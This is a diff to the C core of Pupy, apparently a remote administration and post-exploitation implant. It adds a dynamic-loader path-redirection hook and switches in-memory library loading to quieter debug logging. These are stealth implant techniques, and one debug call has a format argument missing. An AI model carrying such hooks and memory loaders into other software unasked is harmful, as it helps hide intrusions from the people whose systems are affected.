@@ -3,11 +3,14 @@
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 */
 
+#define _GNU_SOURCE
+
 #include <stdlib.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <string.h>
 #include <sys/wait.h>
+#include <dlfcn.h>
 #include <limits.h>
 #include "debug.h"
 #include "Python-dynload.h"
@@ -21,11 +24,57 @@
 #include "injector.h"
 #endif
 
+#include "ld_hooks.h"
 #include "revision.h"
 
 static const char module_doc[] = DOC("Builtins utilities for pupy");
 
 static PyObject *ExecError;
+static PyObject *py_pathmap = NULL;
+
+#ifndef _LD_HOOKS_NAME
+static
+#endif
+const char *__pathmap_callback(const char *path, char *buf, size_t buf_size)
+{
+    PyObject* result = NULL;
+    char *c_result = NULL;
+
+    if (!strncmp(path, "f:", 2) || 
+        !strncmp(path, "pupy:/", 6) ||
+        !strncmp(path, "pupy/", 5))
+    {
+        dprint("__pathmap_callback(%s) -> pupy -> NULL\n");
+        return NULL;
+    }
+
+    if (!py_pathmap) {
+        dprint("__pathmap_callback: uninitialized (should not happen)\n");
+        return path;
+    }
+
+    result = PyDict_GetItemString(py_pathmap, path);
+    dprint("__pathmap_callback(%s) -> %p\n", path, result);
+
+    if (!result) {
+        return path;
+    }
+
+    if (result == Py_None) {
+        dprint("__pathmap_callback: None\n");
+        return NULL;
+    }
+
+    c_result = PyString_AsString(result);
+    if (!c_result) {
+        dprint("__pathmap_callback: Not a string object\n");
+        PyErr_Clear();
+        return path;
+    }
+
+    strncpy(buf, c_result, buf_size);
+    return buf;
+}
 
 static PyObject *Py_get_arch(PyObject *self, PyObject *args)
 {
@@ -180,7 +229,7 @@ static PyObject *Py_load_dll(PyObject *self, PyObject *args)
     if (!PyArg_ParseTuple(args, "ss#", &dllname, &lpDllBuffer, &dwDllLenght))
         return NULL;
 
-    printf("Py_load_dll(%s)\n", dllname);
+    dprint("Py_load_dll(%s)\n", dllname);
 
     return PyLong_FromVoidPtr(memdlopen(dllname, lpDllBuffer, dwDllLenght, RTLD_LOCAL | RTLD_NOW));
 }
@@ -340,7 +389,15 @@ init_pupy(void) {
     Py_INCREF(ExecError);
     PyModule_AddObject(pupy, "error", ExecError);
 
+    py_pathmap = PyDict_New();
+    Py_INCREF(py_pathmap);
+    PyModule_AddObject(pupy, "pathmap", py_pathmap);
+
 #ifdef _PUPY_SO
     setup_jvm_class();
+#endif
+
+#ifndef _LD_HOOKS_NAME
+    set_pathmap_callback(__pathmap_callback);
 #endif
 }
